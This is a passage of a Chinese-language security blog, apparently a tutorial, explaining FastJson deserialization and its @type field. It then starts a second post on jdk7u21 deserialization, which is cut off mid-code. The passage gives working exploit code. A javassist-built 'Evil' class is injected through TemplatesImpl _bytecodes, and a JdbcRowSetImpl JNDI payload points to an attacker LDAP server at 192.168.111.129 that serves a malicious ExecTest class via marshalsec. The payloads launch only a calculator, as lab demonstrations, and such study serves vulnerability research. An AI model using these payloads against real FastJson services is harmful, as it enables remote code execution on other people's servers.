&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>FastJson反序列化有三种方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">14</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        String serializedStr=JSON.toJSONString(user);</span><br><span class="line">        System.out.println(serializedStr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object obj1=JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">&quot;通过parse方法反序列化&quot;</span>);</span><br><span class="line">        System.out.println(obj1.getClass().getName());</span><br><span class="line">        System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">        Object obj2=JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">&quot;通过parseObject方法，不指定类进行反序列化&quot;</span>);</span><br><span class="line">        System.out.println(obj2.getClass().getName());</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        Object obj3=JSON.parseObject(serializedStr,User.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;通过parseObject方法，指定User类进行反序列化&quot;</span>);</span><br><span class="line">        System.out.println(obj3.getClass().getName());</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>执行结果如下</p>
<p><img src="https://www.hualigs.cn/image/608577ba949d7.jpg"></p>
<p>可以看到<code>JSON.parse</code>和未指定对象的<code>JSON.parseObject</code>都会返回<code>JSONObject</code>，而<code>JSON.parseObject</code>指定类后会返回相应的类对象。它们不仅返回结果不同，执行过程中调用的方法也不同。</p>
<h1 id="type字段"><a href="#type字段" class="headerlink" title="type字段"></a>type字段</h1><p>修改User类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> FastJson中有一个特殊字段<code>type</code>，这个字段可以指定反序列化任意类，并且会自动调用类中符合规则的特定的<code>setter</code>和<code>getter</code>方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parse(&quot;&quot;) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</span><br><span class="line"></span><br><span class="line">parseObject(&quot;&quot;) 会调用反序列化目标类的特定 setter 和 getter 方法</span><br><span class="line"></span><br><span class="line">parseObject(&quot;&quot;,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</span><br></pre></td></tr></table></figure>



<p>规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set开头的方法要求如下：</span><br><span class="line">- 方法名长度大于4且以set开头，且第四个字母要是大写</span><br><span class="line">- 非静态方法</span><br><span class="line">- 返回类型为void或当前类</span><br><span class="line">- 参数个数为1个</span><br><span class="line">get开头的方法要求如下：</span><br><span class="line">- 方法名长度大于等于4        </span><br><span class="line">- 非静态方法</span><br><span class="line">- 以get开头且第4个字母为大写</span><br><span class="line">- 无传入参数</span><br><span class="line">- 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</span><br></pre></td></tr></table></figure>

<p>Demo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String jsonstring=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;age\&quot;:80,\&quot;name\&quot;:\&quot;admin\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;parse:&quot;</span>);</span><br><span class="line">        Object obj1=JSON.parse(jsonstring);</span><br><span class="line">        System.out.println(obj1.getClass().getName());</span><br><span class="line">        System.out.println(obj1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject:&quot;</span>);</span><br><span class="line">        Object obj2=JSON.parseObject(jsonstring);</span><br><span class="line">        System.out.println(obj2.getClass().getName());</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;parseObject with class:&quot;</span>);</span><br><span class="line">        Object obj3=JSON.parseObject(jsonstring,User.class);</span><br><span class="line">        System.out.println(obj3.getClass().getName());</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://www.hualigs.cn/image/608577baaece0.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type可以指定反序列化成服务器上的任意类</span><br><span class="line"></span><br><span class="line">然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）</span><br><span class="line"></span><br><span class="line">如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）</span><br></pre></td></tr></table></figure>





<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>基于JDK 7u21 Gadgets，1.7版本通用，利用条件苛刻</p>
<p>利用条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 服务端使用parseObject()时，必须使用如下格式才能触发漏洞：</span><br><span class="line">    &#96;JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);&#96;</span><br><span class="line">2. 服务端使用parse()时，需要&#96;JSON.parse(text1,Feature.SupportNonPublicField);&#96;</span><br></pre></td></tr></table></figure>





<p>jdk7u21反序列化的利用条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.恶意类的父类必须为ABSTRACT_TRANSLET </span><br><span class="line">2.TemplatesImpl类的_bytecodes不为null，为恶意类字节码，payload写在恶意类的静态方法或构造方法</span><br><span class="line">3.TemplatesImpl类的_name不为null</span><br><span class="line">4.TemplatesImpl类的_class&#x3D;null</span><br><span class="line">5._tfactory需要是一个拥有getExternalExtensionsMap()方法的类，即TransformerFactoryImpl()，以此来兼容不同版本</span><br></pre></td></tr></table></figure>



<p>构造exp，FastJson反序列化过程中对<code>_bytecodes</code>、<code>_tfactory</code>等属性进行了操作，需要另外处理</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getevilbyte() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向静态方法中插入要执行的命令</span></span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置满足条件的父类</span></span><br><span class="line">        ctClass.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] EvilByteCodes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> EvilByteCodes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123;</span><br><span class="line">        <span class="comment">//生成恶意类字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = getevilbyte();</span><br><span class="line">        <span class="comment">//将字节码进行base64编码</span></span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);</span><br><span class="line">        String text1 = <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode_base64+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;xx&#x27;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//处理private属性</span></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="bytecodes"><a href="#bytecodes" class="headerlink" title="_bytecodes"></a>_bytecodes</h3><p><code>_bytecodes</code>传输过程中会经过base64解码，所以在payload中需要进行base64编码</p>
<p>FieldDeserializer#parseField</p>
<p><code>parseField</code>中对<code>_bytecodes</code>中的内容进行了解析</p>
<p><img src="https://www.hualigs.cn/image/608577bdaf53a.jpg"></p>
<p><code>deserialize</code></p>
<p><img src="https://www.hualigs.cn/image/608577bd7b350.jpg"></p>
<p><code>parseArray</code></p>
<p><img src="https://www.hualigs.cn/image/608577bd7b350.jpg"></p>
<p><code>ObjectDeserializer#deserializer</code></p>
<p><img src="https://www.hualigs.cn/image/608577bd8fdbc.jpg"></p>
<p><code>byteValue</code></p>
<p>对<code>_bytecodes</code>进行base64解码</p>
<p><img src="https://www.hualigs.cn/image/608577bd93675.jpg"></p>
<p><img src="https://www.hualigs.cn/image/608577bda1ec4.jpg"></p>
<h3 id="tfactory"><a href="#tfactory" class="headerlink" title="_tfactory"></a>_tfactory</h3><p>FastJson会自动新建一个符合要求的对象实例，所以exp中<code>_factory</code>为<code>&#123;&#125;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;deserializer&#x2F;JavaBeanDeserializer.java</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608577be6fc06.jpg"></p>
<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>前面提到了FastJson反序列化会自动调用类中符合规则的特定的<code>setter</code>和<code>getter</code>方法。<code>com.sun.rowset.JdbcRowSetImp</code>l的<code>setAutoCommit()</code>方法中调用了l<code>ookup()</code>，且参数<code>DataSourceName</code>可控，由<code>setDataSourceName()</code>方法设置。由于这两个方法都符合规则，反序列化时自动调用这两个<code>setter</code>方法造成JNDI注入，进而触发命令执行。</p>
<p>JdbcRowSetImpl#setDataSourceName</p>
<p>调用父类的<code>setDataSourceName</code></p>
<p><img src="https://www.hualigs.cn/image/608577bce87af.jpg"></p>
<p>BaseRowSet#<code>setDataSourceName</code></p>
<p>父类的<code>setDataSourceName</code>，把<code>var1</code>赋值给<code>dataSoruce</code></p>
<p><img src="https://www.hualigs.cn/image/608577bcc6881.jpg"></p>
<p><code>setAutoCommit</code></p>
<p>这里调用了<code>connect()</code>方法，<code>var1</code>来源于POC中构造的属性<code>autoCommit</code>，实际测试中发现这个值可以是true也可以是false，只要保证有一个布尔类型的参数传入就不会影响正常执行。</p>
<p><img src="https://www.hualigs.cn/image/608577bd10f67.jpg"></p>
<p><code>connection</code></p>
<p>调用<code>lookup</code>，<code>this.getDataSourceName()</code>等于<code>var1</code>，接着请求我们的ldap服务器，触发命令执行</p>
<p><img src="https://www.hualigs.cn/image/608577bc56bb3.jpg"></p>
<p><img src="https://www.hualigs.cn/image/608577bc6121c.jpg"></p>
<p>接下来就是JNDI注入利用的思路了</p>
<p>使用marshalsec搭建ldap服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8090&#x2F;#ExecTest</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608577cc3bbd5.jpg"></p>
<p>ExecTest</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="keyword">import</span> javax.print.attribute.standard.PrinterMessageFromOperator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        </span><br><span class="line">        String cmd=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>把编译后的恶意类<code>ExecTest.class</code>放到web目录下，然后开启web服务</p>
<p><img src="https://www.hualigs.cn/image/608577bb2d463.jpg"></p>
<p>利用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception </span>&#123; </span><br><span class="line">        String payload = <span class="string">&quot;&#123;\n&quot;</span> + </span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;:\&quot;ldap://192.168.111.129:1389/ExecTest\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608577beae4b9.jpg"></p>
<p>实际执行的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">&quot;ldap://192.168.111.129:1389/ExecTest&quot;</span>);</span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-24T03:01:50.000Z" title="2021-04-24T03:01:50.000Z">2021-04-24</time>发表</span><span class="level-item"><time dateTime="2021-04-26T00:59:22.173Z" title="2021-04-26T00:59:22.173Z">2021-04-26</time>更新</span><span class="level-item">19 分钟读完 (大约2882个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/24/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">jdk7u21反序列化</a></h1><div class="content"><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由javassist负责构建一个恶意类并得到字节码，然后向<code>TemplatesImpl</code>的<code>_bytecodes</code>属性赋值恶意类的字节码，字节码数组在被<code>defineTransletClasses()</code>中被实例化成恶意类，调用构造函数中的命令触发RCE，需要调用<code>getOutputProperties()</code>触发</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恶意类的父类必须为ABSTRACT_TRANSLET </span><br><span class="line">TemplatesImpl类的_bytecodes不为null，为恶意类字节码</span><br><span class="line">TemplatesImpl类的_name不为null</span><br><span class="line">TemplatesImpl类的_class&#x3D;null</span><br><span class="line">_tfactory需要是一个拥有getExternalExtensionsMap()方法的类，即TransformerFactoryImpl()，以此来兼容不同版本</span><br></pre></td></tr></table></figure>



<p><img src="https://www.hualigs.cn/image/60860dfa8b360.jpg"></p>
<p><img src="https://www.hualigs.cn/image/60860dfa9b143.jpg"></p>
<p><code>defindTransletClasses()</code>执行完后，<code>_class[_transletIndex]</code>就已经是恶意类，接下来执行<code>newInstance()</code>实例化恶意类，从而执行构造方法中的payload</p>
<p><img src="https://www.hualigs.cn/image/60860dfb21109.jpg"></p>
<p><code>defineTransletClasses()</code>中恶意类的构造，把恶意类的字节码转换为类的实例类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span 